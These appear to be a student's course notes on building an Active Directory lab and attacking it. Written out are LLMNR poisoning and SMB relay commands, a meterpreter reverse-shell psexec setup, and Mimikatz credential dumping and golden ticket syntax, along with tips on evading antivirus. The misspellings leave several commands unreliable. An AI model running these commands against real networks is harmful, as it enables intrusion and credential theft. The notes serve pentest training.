## What is Active Directory (used in windows)

- `Active Directory is just a login service on a network. A lot important things are found in attacking active directory. Important for interviews.
- Active Directory can be seen like a phone book. All the addresses and information is found in this phone book. U can say that this information is objects.
- Lets say u can login from a username and password u can login from ur computer or from some other computer or from some other computer in some other building but u log into the same account. How? Active Directory manages this.
- This authentication is done by Kerberos and it used tokens or tickets.
- 95% of fortune fortune 1000 companies use active directory. Meaning all the pen test will have this on the internal side.
- We may or may not be using exploits meaning using its feature to exploit its self. We can use trust, components, or other things against the system.

`From Reddit: Active Directory is the authentication system that is built into Microsoft Server, beginning with Microsoft NT. `

`Basically, Active Directory determines what a person will be allowed to do on a computer domain. You know when you log into a computer with your username and password? Ever wonder why you don't have to put your username and password in again to get your email? IF you are on a MS domain, this is because Active Directory has already authenticated you to the domain. AD can be configured to determine what file shares, email accounts, and web sites will be available to individual users.`
### Physical Components of active directory
- Domain Controllers - Like head of all the servers. It hosts `active directory domain service directory store` meaning hosting the phone book. All the information about the devices on the network IPs, user info, printers, credentials etc. Also authentication and authorization(Kenberos).
- If the domain has forest or domain has parent-child relation ship meaning it does replication (if some other domain makes some change it will be reflected all across).
- It is very bad if u can compromise the domain controller because u will gain complete access to the domain.
- NOTE: In a pentest the client also wants to know about some of the other information that u can get from the domain controller like PII (Personally identifiable information, eg credit card, social information). What u have to show is what damage can be caused by exploiting this.
![[Pasted image 20250102171908.png]]

#### There is one more part of domain controller or active directory
- AD DS Data Store This has all the information about services, users and all the other things.
-  Take away File `ntds.dit` this file is very sensitive. U WANT IT! it has all the stored information users, hashes. These can be used for more attacks from this file.
-![[Pasted image 20250102172152.png]]
### Logical Components of Active Directory
1. AD DS Schema:(Rule Book) Defines every type of object that can be creates in the directory (Rule book). Enforces rules regarding object creation and configuration.
2. Domains: Used to group objects together in a single orginisation
![[Pasted image 20250102173239.png]]
Here there one domain contoso.com. This one domain has users, computers, all objects. This domain functions like domain controller.
3. Trees: These are groups of domain in a hierarchy. 1 parent domain 2 child domain. Trees have parent and child relationship. They share name space and they share trust.
![[Pasted image 20250102173635.png]]
4. Forest: Collection of trees
![[Pasted image 20250102173730.png]]
5. OrganizationalUnits (Ous): Containers for your users, computers, groups.
![[Pasted image 20250102173939.png]]
For this time we will be working with single domain only

### Trust 
Trust is how we gain access to resource from one domain to another domain.
![[Pasted image 20250102174207.png]]

### Objects
![[Pasted image 20250102174254.png]]

#### Breaking it down again
Domain are used to manage and group objects
Multiple domains -> Trees (many have parent child relationship)
Multiple Trees -> Forest
OUs -> Consists of Objects
Across domains and forest we have trust. Trust can be directional or transitive.
some interesting labs ->[here]( https://www.reddit.com/r/cybersecurity/comments/196meb2/active_directory_hacking_lab/)
[Game of AD](https://mayfly277.github.io/posts/GOADv2/)
[Orange Cyberdefense GOAD](https://github.com/Orange-Cyberdefense/GOAD)
[Hacking Windows Active Directory](https://www.youtube.com/watch?v=owxF-d_6pJg)
[Hack the box Active Directory](https://www.reddit.com/r/hackthebox/comments/1cf138r/good_boxes_for_learning_ad_pentesting/)
Also search `reddit Active Directory TryHackme `
Also search `tryhackme active directory` Tryhackme has some good rooms
## Building a local lab
#### Download windows 10 iso and Windows Server 2019 iso
##### Creating the lab
These are steps after installation is done. After login
search View your PC name
Rename the server to something sensible for active directory
Name that was chosen in tutorial -> Hydra-DC then restart
After every login server manager pops-up.
Now we install a domain controller. Role based or feature based installation, Server role active directory domain services. Installation it.
There is an alert in right side. It will ask what do you want to call ur domain name MARVEL.local
then  add password keep it something simple.
Then u will see a screen with location of NTDS.
Then there will be a screen install. REBOOT
Now on login in will have MARVEL\Administrator

Installing new machine windows 11 here instead of login choose join domain connected instead.
Enter password, security questions etc. . Rename the computer Punisher (from the course).

Login to your domain controller machine MARVEL\Administrator.

.In server manager -> Tools -> Active Directory Users and Controller
Here u will see marvel local on left it will have some views (Built-in, Computer, Users ,etc). Also users will have some security groups. Make a new group by the name of group. Copy all the groups from users to groups. Administrator user will all the privileges that u can see in member of property.
Now create a new user Frank Castel.
Click on Administrator and copy it (it will create new user. Name it Tony Stark) This will be our domain admin. Copy Frank Castel (change its name) and one more user.
Create a new SQL Service user. Many times admins write the passwords in descriptions because they think only they can read it. NOT TRUE.

Lets set up a file share -> on left "File and Storage Services" Set up a SMB share quick. Share name => hackme. All default settings.
open cmd.exe as administrator. Create SPN (Service Principle Name). Attack Kerberos.
cmd.exe setspn -a HYDRA-DB/SQLService.MARVEL,local:60111 MARVEL\SQLService

search -> group policy (as admin)
Disable windows defender (at this level this is not important + it keeps changing).

##### Joining our machines to domain
This PC -> C: -> right click new folder (share). Properties -> sharing -> share and then share . then all yes.

Now enable frank castle to be local administrator of the machine and same for peter parker.
This is for attack specifically for local administrators on multiple machines.

What ever this is some bull shit about connecting machines with using IP of domain controller with DNS.
Join `MARVEL.local` who do u want to join as `Administrator`.
Reboot now login as user.

##### The setup so far
F Castel will log in as the punisher and other use is the Peter Parker who will log in as Spiderman(we are making this machine).

Log in as marvel\administrator and make F Castel to be local admin then in Peter Parker machine the make F Castel and Peter Parker to be local admin on that machine as well.(This is done for a special attack)
So the set up is one user is local admin on there machine and the other machine and other user is admin on there machine.
Now,
## Attacking Active Directory
#### Attack vectors
First, U have to find some way in the network (RDP, or a physical machine, no credentials),
Now how to miss use the features.
Great article [How I got domain admin on your network before lunch](https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
If u read and understand this article u will be good for interview process.

**LLMNR Poisoning**
![[Pasted image 20250104235903.png]]
Link-Local Multicast Name Resolution(LLMNR). This service is basically DNS.
LLMNR identifies host when DNS fails to do so.
Previously known as NBT-NS
Key flaw is that this service utilizes a user's username and NTLMv2 hash when appropriately responded to.

When we respond to this service it responds back with username and password hash.

![[Pasted image 20250104235938.png]]

So, basically u are doing a man in the middle attack when the DNS fails and the victim machine is asking network server how to find the domain or server that it is looking for hacker will respond with `"yes I do know, send me ur hash and username"` and then we use those.
Tool used `Responder`
Best time to run this is morning or after lunch because people are logging in. Run even before Nmap.
So someone writes the wrong network drive and DNS fails but we are listening.
![[Pasted image 20250105001345.png]]
This is an example for credentials that we found. Then use hashcat to crack the password.
![[Pasted image 20250105001459.png]]
After we have cracked a password we can use that to dig into the network.
Summary, you are performing man in the middle attack (MITM) and listening for wrong DNS request respond to it with responder and get username and hash.
install impact toolkit from impact GitHub.

**Starting the Attack**
responder -I eth0 -rdwv 
- **`responder`**: The name of the tool. Responder is commonly used for Man-In-The-Middle (MITM) attacks, specifically targeting Windows authentication methods like NTLM and LLMNR (Link-Local Multicast Name Resolution).
    
- **`-I eth0`**: Specifies the network interface to listen on.
    
    - `eth0` is the name of the network interface. Replace it with the correct interface name for your system if necessary (e.g., `wlan0` for Wi-Fi).
- **`-r`**: Enables **NBT-NS (NetBIOS Name Service) poisoning**. This attack intercepts NetBIOS name resolution requests and responds with malicious data to redirect traffic.
    
- **`-d`**: Enables **DNS poisoning**, which intercepts and spoofs DNS responses to redirect traffic.
    
- **`-w`**: Enables **WPAD (Web Proxy Auto-Discovery) attack**, which responds to WPAD requests to trick clients into using a malicious proxy.
    
- **`-v`**: Enables **verbose mode**, which provides detailed output of Responder's operations, including what it's capturing and any responses.

Now in windows machine open file share and in the path above write `\\ATTACKER_IP`..

On Attacker system

![[Pasted image 20250105003253.png]]

Recap, first thing run responder listen and wait.
NOTE: Now clients are getting smarter and deactivating LLMNR this avoids the possibility of this attack. However most of the companies are still using LLMNR(still a win to poison it).

**Cracking the hash**
hashcat --help will list all the hashes but we know that this is NTML hash. A shortcut is
![[Pasted image 20250105003723.png]]
For wordlist u can just use rockyou.txt or be precise and use some custom wordlist or maybe your employer has there own wordlist.
Best practice is to use hashcat on base OS.
What will the hash look like
![[Pasted image 20250105004414.png]]
The entire capture with the username and hash saved on one file and then use hashcat.

![[Pasted image 20250105004855.png]]
-m 5600 for hast type we saw in hashcat --help
-O Optimize
Most clients are using LLMNR and do not have a password policy. This is why LLMNR poisoning is such a good attack for initial foothold.
One other thing is that if u captured a hash and could not crack it, it is a good indicator of there password policy is good (let them know).
If cracking does not work make custom wordlist company_name1, username_1, try some simple possible password combination. Think like someone who is trying to get away with remembering there password.
**Mitigation**
![[Pasted image 20250105005750.png]]
This is copy and past for what u can send to the client.
If then can not disable LLMNR and NBT-NS use network access control. It will filter based on Mac Address.
But there are bypassed for this as well.
Require strong passwords +14 password and stress on longer passwords.

Now we will learn how to use the hash to get some level of access(gain access to a machine).

**SMB Relay**
What if we can use the hash without cracking it. Think that hash was being sent to some server right? What if we can just relay them to some other machine.

Requirement -> SMB signing should be disabled or it will check for where the hash is coming from is it coning from the correct machine(is this hash value correct for this machine) and,
Relayed user credentials must be admin on machine.

In the responder configuration file we will Turn off SMB and HTTP.
Next configure ntlmrelayx.py we decide what targets and what to do.
![[Pasted image 20250105201014.png]]

So DNS fails then we capture the credentials and the use ntlmrelayx.py to attack the targets.
![[Pasted image 20250105201127.png]]
Note we are dumping imp files most important dumped file is SAM file has username and hashes.
Summary, we first grab a hash relay it if SMB signing is disabled and it is admin then we can dump files or we can get a shell
Before we beguine, on both the machines turn on network -> network discovery on.

How to find machines with SMB signing disables.
First method nmap with a special script, second nesses scan or some other script from github (check for safety)
![[Pasted image 20250105201909.png]]
If `Message signing enables but not required` or disabled this attack will work on that machine. Add this machine into target.txt. For our attack to keep it simple we only add one machine.

Now we will relay our credentials from responder.
Set up responder.conf file 
turn off SMB and HTTP.

Run `responder -I eth0 -rdwv`
Next step setting up the relay `ntllmrelayx.py -tf targets.txt -smb2support`
Now server is listening
On punisher machine enter some Ip that does not exist
Then on attacker machine
![[Pasted image 20250105202638.png]]
Look there are hashes you can try to crack them and work on lateral movement or just pass them around.

Now how to make this shell interactive (part2) `ntllmrelayx.py -tf targets.txt -smb2support -i`
 Now when u will simulate the attack again u will see that it writes what port it has started the shell.
 ![[Pasted image 20250105203235.png]]
`nc localhost 11000` This will give u SMB shell.
Please explore the commands in this shell.
But u can also use a msfvenom payload and listen with multi handler.
just add -e 'payload.exe' in the end.

How to defined,
![[Pasted image 20250105203802.png]]

Now, gaining shell access.
Metasploit => search psexec to get run Powershell.
Set this up and run
Note: This may miss on first attempt. Also this many be detected by windows defender.
Try psexec.py 
![[Pasted image 20250105210227.png]]
or u can try smbexec.py or wmiexec.py or metasploit -> exploit/windows/smb/psexec_psh
 or even something else.
 Avoid metasploit for detection at first but after u have a shell try to navigate around the system and figure out what antivirus they are running and try to disable it to try some of the other attacks.

#### IPV6 Attacks
We will use [MITM6](https://github.com/dirkjanm/mitm6)
Some changes in the lab
in the domain controller
Manage -> add roles and features -> next -> next => next -> Active directory Certificate Service Next all of them.
Click on the flag on the top right corner -> Roles Services -> Certification Authority -> next -> next -> next -> Private Key -> Validity Period ->  change 5 to 99.
Now reboot this server.
Attack
`mitm6 -d marvel.local`
and
![[Pasted image 20250105223237.png]]
Now reboot the windows 10 machine.
This will allow us the see some action because ipv6 is sending a reply "who has my DNS" in every 30 mins.
![[Pasted image 20250105223825.png]]
u can see that it is dumping information in lootdir
![[Pasted image 20250105223907.png]]
`firefox domain_users_by_groups.html`
here u can see a lot of information the most important one is description! Remomber how we discussed that some admins put there password in description thinking it is not visible we can see it without doing any thing.
Also in this folder we can find who is the domain admin and who do we need to attack.
Log into the windows 10 machine. Check back into the attacker box something amazing happened.
![[Pasted image 20250105224716.png]]

Then it created a new user for us
![[Pasted image 20250105224804.png]]
This tool can do much more. Please read more about it in the blog [here](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/). You can even add a new computer to the network.
**Defending**
![[Pasted image 20250105225308.png]]
### Passback Attacks
What is this? This attack goes back to printer and other IOT devices. This is a bug.

Story time -> There was this printer with default credentials. And there were 2 setups SMB server for printer to scan files and send them to SMB server. But for some reason they had CEOs credentials sitting there for some reason as `l.connection` so just a default password and a technique for seeing the password
So we are looking for something that connects to LDAP or SMB connection.
![[Pasted image 20250105232328.png]]
Here sometimes u can see the password with just inspect element or sometimes password is not visible by inspect element. But u can see above there is an input for IP and this is exploitable. We can use netcat to listen and point this IP to our IP.
![[Pasted image 20250105232642.png]]
Same thing for SMPT. Very easy win.
Now we know all the attacks how do we use them 
Begun with man in the middle or responder. 8Am or after lunch.
If scans are taking too long then use a simple scan for http. HTTP_VERSION (metasploit).
Then check the websites for default or simple passwords.
Scanning 80 and 443 is better because a network is expecting it. 
Also look for IOT devices like printer.
Printer has a scan feature for scanning and sending files to SMB server the user may be made by admin and they will make the user domain admin. U many be able to dump those passwords.

![[Pasted image 20250105234131.png]]

Story Time ->Pentest on medical environment No SMB LMNR was working but IMAP was working on clear text and this was a password worked for phone system. They u can change redirection and phone numbers. These phone numbers worked for resetting the office outlook passwords. Now u can reset password of admin and reset call will be send to my phone. now u can by pass the MFA.

So, Enumeration is the key not exploitation.
# Post Compromise Enumeration
Power view: Used for looking at the network domain policies etc.
Bloodhound: Visualize what is going on in domain and what can be the weak spots. 
Power view [GitHub](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1). Just copy past this file on either one of the windows machine and run it for enumeration.

## Power view
cmd.exe -> 
`powershell -ep bypass` Execution policy is there for not executing scripts that we might execute by accident.
`..\Powerrview.ps1 `
Please read up on powerview  on much deeper level powerview is quite powerfull.
`Get-NetDomain`
`Get-NetDomainController`
These commands will give u some more information about what you might want to attack next.
`Get-DomainPolicy` Kerberos Policy and more.
`(Get-DomainPolicy)."system access"`
This will show u some very interesting information. Like min password length.


`Get-NetUsers` to see all the users
`Get-NetUser | select cn` this will show all the users
`Get-NetUser | select samaccountname`
`Get-NetUser | select description`
`Get-UserProperty`
`Get-UserProperty -Properties pwdlastset`
`Get-UserProperty -Properties logoncount` If some account has 0 logins it may be a honeypot.
`Get-UserProperty -Properties badpwdcount`
`Get-NetComputer` dumps the domain info
`Get-NetConputer -FullData` dumps all the information of domain
`Get-NetGroup`
`Get-NetGroup -GroupName "Domain Admins"`
`Get-NetGroupMember -GroupName "Domain Admins"`
`Invoke-ShareFinder` Finds shares
`Get-NetGPO` All the group policies
`Get-NetGPO | select displayname, whenchange`

Please paly around with this because this is were powerful. Please watch this video again.

## Blood Hound
Blood Hound makes finding stuff very fast. All the complex ways in the network and who if what will become very eays.
`apt install bloodhound` # Large install
blood hound runs on neo4j so lets configure it
`neo4j console` # This will start browser window for set up
Open a new tab. type `bloodhound` login in the browser window
U might see a message no data returned from query because there is no data collected. Collecting data from the machines.
search 'invoke-bloodhound' there will be many options to pick from like C#,PS, python and maybe more. We are using PS.

now on windows computer in terminal
`powershell -ep bypass`
`..\SharpHound.ps1`
Invoke-BloodHound -CollectionMethod All -Domain MARVEL.local -ZipFileName file.zip
![[Pasted image 20250107202237.png]]
This will create a zip file and u need to take this file to kali machine to be used in bloodhound.
Upload the files to bloodhound. Now after importing is completed click on hamburger menu to view the information.
This is a very useful menu Queries window will have visual representation for all the services ,sessions and more.
![[Pasted image 20250107202858.png]]
This is super easy as u can see in the above picture all the information is of 3 computers and 9 users. Imagine trying to figure this out on a very large network on your own. You can even find what users are domain admin with just one click.
This is all blood hound is an enumeration tool.
Next, post compromise attacks,
# Post-Compromise Attacks
U need some sort of shell or foothold or username and password for these attacks to take place.
Attacks like pass the hash, pass the password, token impersonation, kerberoasting, GPP see password attack, golden ticket attack. Exiting stuff.
## Pass the hash and pass the password
One of the first things I like to do
After u have credentials why not pass them around on every device on network.
Tool used `crackmapexec`
##### Pass the password
![[Pasted image 20250107212711.png]]
##### Pass the hash
![[Pasted image 20250107212827.png]]

Install `apt install crackmapexec`
First check the status different in new crackmapexec.
crackmapexec smb local_Ip. Meaning just prefix smb before IP.
![[Pasted image 20250107213716.png]]
Note this is checking if there are smb accounts of these users on PC.
Dumping sam file
![[Pasted image 20250107214031.png]]
This failed but it may work. There are a lot of things one can do with this tool so please read more on this.
While spraying password u may want to keep in mind that admin accounts will block ur account
But local accounts can be brute forced many times.
Next dumping the hashes.
#### Dumping the Hashes
To dump hashes u can dump hashes by metasploit hashdump this will be noisy and may get detected by Anti virus. Or u can use secretsdump.py from impacket.
![[Pasted image 20250107214855.png]]
Also all the hashes u are receiving please check if they are re-using the hashes.
![[Pasted image 20250107215223.png]]
As u can see the administrator is re-using the hashes.
Next we will look at passing the hashes, we do not even need to crack those hashes. good!

#### Cracking NTML hashes with hashcat
We have cracked NTML v2 hashes. In the SAM we have NTML hashes.
NOTE: U can pass around NTLM hashes but not NTML v2 hashes.
![[Pasted image 20250107220233.png]]


#### Pass the hash
U will pass the hashes without cracking them
![[Pasted image 20250107220651.png]]
Just copy the 2nd half of the hash and use crackmapexec.py

![[Pasted image 20250107220844.png]]
New syntax
![[Pasted image 20250107220911.png]]Actual command. Note this many give false positive.
Passing the hash u never know what u will find
Story Time: In an assessment they were using privilege access management. Greater mitigation for these attacks. Ur password is very long and complex and changes after 8hrs. So cracking the hashes is not possible but I caught a hash and it owned every thing.
U may be spending million dollars on security but if your local admin account safe it is over just from the hash.

Now passing
![[Pasted image 20250107224049.png]]
Please note u need the entire hash not just second half.

![[Pasted image 20250107224310.png]]


## Token Impersonation
Temporary keys that allow you access to a system/network without having to provide your password each time u access a file. 
Like cookies for computer.
2 Types:
- Delegate - Created for logging into a machine or using Remote Desktop
- Impersonate - "non-interactive" such as attaching a network drive or a domain logon script.
Delegate Tokens are much easiest to show so lets do that.
After getting shell in meterpreter load tokens then list tokens then get into there shell by using the token. Then try to dump all the hashes.
![[Pasted image 20250107230948.png]]
STEP 2
![[Pasted image 20250107231012.png]]
Here access was denied but here it was denied. Because of some reason but what if token was available.
![[Pasted image 20250107231244.png]]

Dumping hashes
![[Pasted image 20250107231429.png]]

Take away: I u have a token of local admin that u can impersonate that means u have domain admin.
For carrying this attack we need msfconsole.
use exploit/windows/smb/psexec
[set options]
set payload windows/x64/meterpreter/reverse_tcp
run
![[Pasted image 20250107232057.png]]
Now u can use tools for dumping passwords. they prefix load.
Inject PowerShell as well
First you have to load incognito feature.
`list_tokens -u`
![[Pasted image 20250107232703.png]]
U can see that Marvel\\\Administrator is available so lets try to use that.
![[Pasted image 20250107232757.png]]

![[Pasted image 20250107232859.png]]
Ok this happened because we were not running as root of the machine after this.  rev2self will make this session go back to the original session that we started as.
Recap,
Why did it work why did we find administrator account token because admin had a running session on that machine. Delegate tokens are for logins or RDP. They exist till token is rebooted.
If some other user shows up and logs in then u can get there token as well through the same meterpreter session.
Something interesting most servers do not reboot that much. This means that token will sit there till for a long time.
![[Pasted image 20250107233807.png]]
Up next kerberoasting attack
## kerberoasting attack
How does kerberoasting work. Domain Controller works as a Key Distribustion Center (KDC). The User/Victim will authenticate to domain controller to get TCT(ticket granting ticket) by providing a hash.
The domain controller will grant TGT and encrypt that with Kerberos TGT hash.
So we need username and password. And any valid user will get a ticket granting ticker.
What happens next? 
There is an application server (SQL, HTTP what  ever). For accessing this service we need TGS (ticket granting service) from domain controller. So we will request this with TGT.
The server knows the server account hash which will be encrypted but it does not know if we have access to the server.
![[Pasted image 20250108085810.png]]
We can use a tool `GetUserSPN.py` from impacket
![[Pasted image 20250108085903.png]]
After we have hash we can just use hashcat to crack it
![[Pasted image 20250108090007.png]]
Refresher, TGT request with username and password (does not need to be admin account) then  request TT with a hash.
GetUsersSPN.py [domain/username:Password] -dc-ip (domain controller IP) IP -request (request TGS).
Then use hashcat to crack. This can be used for moving to neighboring machines or even domain controller.
![[Pasted image 20250108090735.png]]
This means not much can be done for mitigation because this is using features of active directory.


# Group Policy Preferences (GPP)
This allows admin to create policies using embedded credentials in a XML file.
Sorted in type cpassword cpassword was encrypted but accidentally released.
But is parched in MS14-025 but does not prevent previous issues.
So if an admin has implemented stored group policy before the policy before the patch was released then this will display credential to us(domain credentials). 
This is some thing that u should check for because a lot of server 2012 machines that this is not patched on or maybe this was running on.

Read the These articles 
https://infosecwriteups.com/attacking-gpp-group-policy-preferences-credentials-active-directory-pentesting-16d9a65fa01a
https://stridergearhead.medium.com/gpp-attacks-ad-post-compromise-attack-44c7f447fb65
https://www.rapid7.com/blog/post/2016/07/25/pentesting-in-the-real-world-gathering-the-right-intel/
Exploitation steps:
Password was stored in SYSVOL and any domain user not just domain admin can read this.
![[Pasted image 20250108092709.png]]
Then u just run GGP decrypt (inbuilt in kali).
![[Pasted image 20250108092747.png]]
How to check for this vulnerability There is a metaploit module

![[Pasted image 20250108092827.png]

![[Pasted image 20250108092851.png]]
So on older machines this is something u just have to check for.
There is a hack the box machine called "Active" practice on that.
First we will see how to enumerate this machine and second how to attack this machine.
![[Pasted image 20250108093133.png]]
88 is running Kerberos. Also check that lsap and ldapssl is running so with port 53 and all these ports open we can assume safely that this machine is running Kerberos and domain controller not just some router on port 53.
SMB Enumeration: 
![[Pasted image 20250108093404.png]]
Out of these folders the one that allows u to connect is Replication. Other will deny connection.
Now this folder has some interesting files especially Groups.xml

`prompt off` for switching the prompt off while downloading the file.
`recurse on` for downloading all the files that we tell it to at once
`mget *` to download all the files

Now we have downloaded Groups.xml

U can use Metasploit module or PowerShell scripts for this.
Open the xml file u can see the cpasswd, name of domain.
So use hash 
`gpp-decrypt`
![[Pasted image 20250108094140.png]]
So simple password cracking without wordlist because of Microsoft leak.
Now part2. Login with this account this is low level account what account we can run to escalate this.

Part 2
trying psexec.py
![[Pasted image 20250108094631.png]]
GetUsersSPNs.py
![[Pasted image 20250108094716.png]]
This returned a hash and this will be cracked via hashcat
So we have successfully koreroesed this account plus it is admin account use psexec.py to log in to the shell.

Take away form this, after u have some local admin or user u can try attacks like koreroing or gpp-decrypt.

# Mimikatz Overview
So u have compromised the user who has some sort of access to share. This can be used to capture more hashes via responder then u can crack them via hashcat.
Basically this is malware in a file(trojan). 

So we have a share and some user may open the drive and possibly open this file
SCF attack this attack still works but URL attack is better. Please read more on these attacks.
Basically social engineering. They open the file and we capture there hash in responder. The file makes a request.

![[Pasted image 20250108095640.png]]

in the share add this file.
The reason that this file has `@` is to place this at the top.
`~` works as well and `.url` as extension.
So a URL file as the first thing we see.
Naming should be related to the folder so that people click on it.
Run responder
`responder -I eth0 -v`
Now on the windows machine just click on the URL file.
Now responder will catch the hashes.
Without even opening the file hashes will load on responder.

# Mimikatz
What is this? Tool to steel credentials, generate kerberose and more
![[Pasted image 20250108100549.png]]We can not learn all these attacks just some important attacks for interviews and certifications.
GitHub mimikatz (cute kittens in French)
[Repo](https://github.com/gentilkiwi/mimikatz/security) Only use repo by gentilkiwi.
This is treated as a malware in windows so this will get caught then then they release a new version or commit which will work for some time again then the same thing.

Something important:
We are assuming that u have already compromised domain controller so just download this on domain controller.

Domain Controller: 
So on the domain controller download mimikatz and unzip it
Run the exe `mimikatz.exe`
next in mimikatz run `privilege::debug`

If privilege 20 ok is returned it means. we can debug some operations that we might not have had privilege to other wise. This is GOOD!
![[Pasted image 20250108101909.png]]

`sekurlsa:logonpasswords` This will load all hashes that are available to this computer (meaning all the user hashes stored in memory since reboot).

The hashes may be NTML instead of NTML v2 (U can pass around NTML).

Something cool: Windows 7 and before there was feature that stored password in clear text. But it is patched from windows 8. The feature still exists they just turned it off. Mimikatz can turn it on.
So if u can be patient u can wait for some one to logon. Also it will be switched on even after reboot.
Dumping SAM File
![[Pasted image 20250108114937.png]]
Here it failed but it does not mean it in not possible on this computer. Use some alternate options.
secretsdump.py, Metasploit, or just download the SAM file. There are alternate methods for every thing.

Dumping LSA (Local Security Authority) local authentication on windows.

`lasadump::lsa /patch`
`lasadump::lsa`

![[Pasted image 20250108115723.png]]

Why do we do this? Cracking them offline. to relay back to the client if u cracked 50% there password policy was bad or if u could only crack 1 or 2 passwords it means there password policy is good.
Above u can see the `krbtgt` hash (Kerberos ticket granting ticket) as well which will be used for Kerberos attacks like "golden ticket".

## Golden Ticket
This is the last attack.
Last time we dumped kerberose ticket granting ticket account. Now we have hash for that account.
Now with this hash we can request access to any machine on the network. shell, services etc. complete control.

`privilage::debug`
`lsadump:lsa /inject /name:krbtgt`
We need the Sid of domain and the krbtgt hash
kerberose::golden /User:Administrator /domain:marvel.local /[Sid] /krbtgt:[Hash] /id:500 /ptt
Kerberose golden ticket attack FakeUser/Real /ReadDomain /ItsSid /krbtgt:[hash] /id:500 means admin (r id) /ptt pass the ticket
![[Pasted image 20250108120907.png]]

Now we can use the session golden ticket has created.
`dir \\THEPUNISHER\c$`
Take this a step further and download psexec.exe and run it against this computer
![[Pasted image 20250108121511.png]]
This is an awesome attack complete control of the machine.

Now u can have complete control of the network.
This attack is getting picked up a bit by network admins. But then there is silver ticket attacks.

